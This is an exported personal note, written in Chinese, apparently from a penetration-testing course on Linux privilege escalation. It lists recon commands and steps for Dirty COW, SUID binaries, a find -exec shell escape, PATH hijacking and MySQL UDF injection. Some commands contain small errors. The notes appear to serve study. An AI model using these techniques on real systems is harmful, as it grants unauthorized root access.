{"ID":"20241029090849-x6kghs4","Spec":"1","Type":"NodeDocument","Properties":{"id":"20241029090849-x6kghs4","title":"Linux提权","updated":"20241029193326"},"Children":[{"ID":"20241029091539-qtb9r69","Type":"NodeBlockquote","Properties":{"id":"20241029091539-qtb9r69","updated":"20241029091549"},"Children":[{"ID":"20241029090849-j9mwkmp","Type":"NodeParagraph","Properties":{"id":"20241029090849-j9mwkmp","updated":"20241029091549"},"Children":[{"Type":"NodeText","Data":"Linux安装好系统后里面"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"自带的软件"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"或"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"内核"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"存在的漏洞，比较流行的有“"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"脏牛提权"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"”\nLinux内核提权跟Windows一样，都要下载对应漏洞的脚本进行提权"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241029091603-t5p124w","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241029091603-t5p124w","updated":"20241029091609"},"Children":[{"Type":"NodeText","Data":"Linux提权步骤"}]},{"ID":"20241029091615-3an3abp","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","id":"20241029091615-3an3abp","updated":"20241029091635"},"Children":[{"Type":"NodeText","Data":"信息收集"}]},{"ID":"20241029091636-p74zw57","Type":"NodeTable","TableAligns":[0,0],"Properties":{"colgroup":"min-width: 60px;|width: 892px;","fold":"1","heading-fold":"1","id":"20241029091636-p74zw57","updated":"20241029092551"},"Children":[{"Type":"NodeTableHead","Data":"thead","Children":[{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"命令"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"说明"}]}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"uname -a"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"打印所有可用的系统信息"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 50%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092015-d4wu6ik.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 50%;\"}"},{"Type":"NodeBr","Data":"br"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"uname -r"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"内核版本"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092119-1v9uaaj.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"},{"Type":"NodeBr","Data":"br"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"uname -m"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"查看系统内核架构（64/32）"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092259-nqr0g80.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeBr","Data":"br"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"cat /proc/version"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"内核信息"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 50%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092326-exllm7k.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 50%;\"}"},{"Type":"NodeBr","Data":"br"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"cat  /etc/issue"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"发行版本信息"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092344-koh0e1u.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"},{"Type":"NodeBr","Data":"br"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"whoami"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"当前用户"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092356-s2ewojf.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeBr","Data":"br"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"id"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"当前用户信息"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092406-tx8us3z.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"},{"Type":"NodeText","Data":"​"},{"Type":"NodeBr","Data":"br"}]}]}]},{"ID":"20241029091623-xmunejo","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029091623-xmunejo","updated":"20241029091623"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20241029092917-n81zyen","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241029092917-n81zyen","updated":"20241029092932"},"Children":[{"Type":"NodeText","Data":"查找相关版本的内核漏洞"}]},{"ID":"20241029193319-az19yv7","Type":"NodeParagraph","Properties":{"id":"20241029193319-az19yv7","updated":"20241029193326"},"Children":[{"Type":"NodeText","Data":"exp搜索"}]},{"ID":"20241029092938-6p2gt92","Type":"NodeParagraph","Properties":{"id":"20241029092938-6p2gt92","updated":"20241029092938"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092938-8gozkbl.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029093149-fsc75o0","Type":"NodeParagraph","Properties":{"id":"20241029093149-fsc75o0"}},{"ID":"20241029093154-h79i6td","Type":"NodeParagraph","Properties":{"id":"20241029093154-h79i6td","updated":"20241029093158"},"Children":[{"Type":"NodeText","Data":"404.php 404"}]},{"ID":"20241029093159-ukea3ji","Type":"NodeParagraph","Properties":{"id":"20241029093159-ukea3ji","updated":"20241029093246"},"Children":[{"Type":"NodeText","Data":"大于2.6.22就可以使用脏牛提权了"}]},{"ID":"20241029093247-vqbhiim","Type":"NodeParagraph","Properties":{"id":"20241029093247-vqbhiim","updated":"20241029093507"},"Children":[{"Type":"NodeText","Data":"gcc -pthread dirty.c -o dirty -lcrypt"}]},{"ID":"20241029093530-t877htu","Type":"NodeParagraph","Properties":{"id":"20241029093530-t877htu","updated":"20241029093538"},"Children":[{"Type":"NodeText","Data":"./dirty ljwsb"}]},{"ID":"20241029093608-whcg7wc","Type":"NodeParagraph","Properties":{"id":"20241029093608-whcg7wc","updated":"20241029093625"},"Children":[{"Type":"NodeText","Data":"验证  id firefart  "}]},{"ID":"20241029093626-5i34e7q","Type":"NodeParagraph","Properties":{"id":"20241029093626-5i34e7q","updated":"20241029093631"},"Children":[{"Type":"NodeText","Data":"cat /etc/passwd"}]},{"ID":"20241029093823-7w32jim","Type":"NodeParagraph","Properties":{"id":"20241029093823-7w32jim","updated":"20241029093823"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029093823-g4npmkb.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029093834-ec1wtqq","Type":"NodeParagraph","Properties":{"id":"20241029093834-ec1wtqq"}},{"ID":"20241029093837-oxckffy","Type":"NodeParagraph","Properties":{"id":"20241029093837-oxckffy","updated":"20241029093847"},"Children":[{"Type":"NodeText","Data":"msf提权"}]},{"ID":"20241029100226-jvn4jxb","Type":"NodeParagraph","Properties":{"id":"20241029100226-jvn4jxb","updated":"20241029100226"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029100226-wakg64u.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029100256-rw5fsv1","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241029100256-rw5fsv1","updated":"20241029100301"},"Children":[{"Type":"NodeText","Data":"suid提权"}]},{"ID":"20241029102139-8j0yfyg","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029102139-8j0yfyg","updated":"20241029102543"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"vi demo.c\n#include\u003cunistd.h\u003e\nvoid main(){\nsetuid(0);\nsetgid(0);\nsystem(\"su - root\");\n}\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029102137-bav60xk","Type":"NodeParagraph","Properties":{"id":"20241029102137-bav60xk","updated":"20241029102628"},"Children":[{"Type":"NodeText","Data":"gcc demo.c -o demo"}]},{"ID":"20241029102634-9pieyyj","Type":"NodeParagraph","Properties":{"id":"20241029102634-9pieyyj","updated":"20241029102655"},"Children":[{"Type":"NodeText","Data":"chmod 777 demo.c"}]},{"ID":"20241029102658-0h6klw6","Type":"NodeParagraph","Properties":{"id":"20241029102658-0h6klw6","updated":"20241029102702"},"Children":[{"Type":"NodeText","Data":"su gua"}]},{"ID":"20241029102705-a2jlh1d","Type":"NodeParagraph","Properties":{"id":"20241029102705-a2jlh1d","updated":"20241029102709"},"Children":[{"Type":"NodeText","Data":"./demo"}]},{"ID":"20241029102612-r0q9txi","Type":"NodeParagraph","Properties":{"id":"20241029102612-r0q9txi"},"Children":[{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029102607-rnycmbt.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241029101943-oxd35j5","Type":"NodeParagraph","Properties":{"id":"20241029101943-oxd35j5"}},{"ID":"20241029101943-hnws8wf","Type":"NodeParagraph","Properties":{"id":"20241029101943-hnws8wf","updated":"20241029102011"},"Children":[{"Type":"NodeText","Data":"更换环境变量："}]},{"ID":"20241029102011-yw39sqs","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029102011-yw39sqs","updated":"20241029102107"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"export $PATH=/tmp:$﻿PATH\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029102026-1qac60z","Type":"NodeParagraph","Properties":{"id":"20241029102026-1qac60z","updated":"20241029102028"},"Children":[{"Type":"NodeText","Data":"验证"}]},{"ID":"20241029102029-4rf0vef","Type":"NodeParagraph","Properties":{"id":"20241029102029-4rf0vef","updated":"20241029102039"},"Children":[{"Type":"NodeText","Data":"echo $PATH"}]},{"ID":"20241029102947-h9fkpw6","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","id":"20241029102947-h9fkpw6","updated":"20241029102957"},"Children":[{"Type":"NodeText","Data":"find_Suid提权"}]},{"ID":"20241029103130-ro57fbs","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103130-ro57fbs","updated":"20241029103149"},"Children":[{"Type":"NodeText","Data":"部署环境root"}]},{"ID":"20241029103041-3nstqae","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103041-3nstqae","updated":"20241029103051"},"Children":[{"Type":"NodeText","Data":"which find 查找"}]},{"ID":"20241029103110-pyrmqa6","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103110-pyrmqa6","updated":"20241029103127"},"Children":[{"Type":"NodeText","Data":"chmod u+s /usr/bin/find"}]},{"ID":"20241029103144-pkyejyw","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103144-pkyejyw"}},{"ID":"20241029103150-pc8ugb0","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103150-pc8ugb0","updated":"20241029103154"},"Children":[{"Type":"NodeText","Data":"普通"}]},{"ID":"20241029103155-0bewksf","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103155-0bewksf","updated":"20241029103209"},"Children":[{"Type":"NodeText","Data":"cd /tmp"}]},{"ID":"20241029103209-0b7t77n","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103209-0b7t77n","updated":"20241029103241"},"Children":[{"Type":"NodeText","Data":"find dcro-ubuntu -exec \"whoami\""}]},{"ID":"20241029103353-ja98tvn","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103353-ja98tvn","updated":"20241029103452"},"Children":[{"Type":"NodeText","Data":"find dcro-ubuntu -exec \"/bin/sh\"  临时交互平台，用的root用户权限，/bin/bash不行"}]},{"ID":"20241029103144-1qlq4lj","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103144-1qlq4lj"}},{"ID":"20241029103508-cdykzky","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103508-cdykzky","updated":"20241029103508"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029103508-96sis4t.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029103529-zze29k2","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103529-zze29k2"}},{"ID":"20241029103530-uk30mrk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103530-uk30mrk","updated":"20241029103601"},"Children":[{"Type":"NodeText","Data":"suid要有s属性，就能以所属者的权限执行"}]},{"ID":"20241029103602-gcimjba","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103602-gcimjba"}},{"ID":"20241029103610-ydo774t","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103610-ydo774t"}},{"ID":"20241029103610-zs1zfjz","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103610-zs1zfjz","updated":"20241029103619"},"Children":[{"Type":"NodeText","Data":"Mysql UDF提权"}]},{"ID":"20241029103649-ijbpa6a","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029103649-ijbpa6a","updated":"20241029103650"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"select unhex('udf十六进制內容’) into dumpfile '/usr/lib64/mysql/plugin/ichunqiu.so'\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029103655-wkvtvsh","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103655-wkvtvsh","updated":"20241029103704"},"Children":[{"Type":"NodeText","Data":"dll头部"}]},{"ID":"20241029103711-fe5bnwk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103711-fe5bnwk","updated":"20241029103711"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029103711-uuohtip.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029103713-5pwdytv","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103713-5pwdytv"}}]}